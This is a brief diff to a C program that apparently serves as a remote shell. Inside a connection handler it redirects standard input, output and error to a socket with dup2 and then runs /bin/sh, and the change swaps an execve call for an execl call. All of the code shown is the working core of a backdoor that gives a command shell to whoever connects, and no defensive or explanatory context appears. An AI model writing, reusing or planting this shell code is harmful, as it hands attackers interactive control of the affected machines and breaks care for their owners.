@@ -53,7 +53,8 @@ int main(int argc, char* argv[]) {
             dup2(connect_fd, 0);
             dup2(connect_fd, 1);
             dup2(connect_fd, 2);
-            execve("/bin/sh", argv, __environ);
+            //execve("/bin/sh", argv, __environ);
+	    execl("/bin/sh","sh",NULL,NULL,NULL);
             exit(0);
         }
         close(connect_fd);
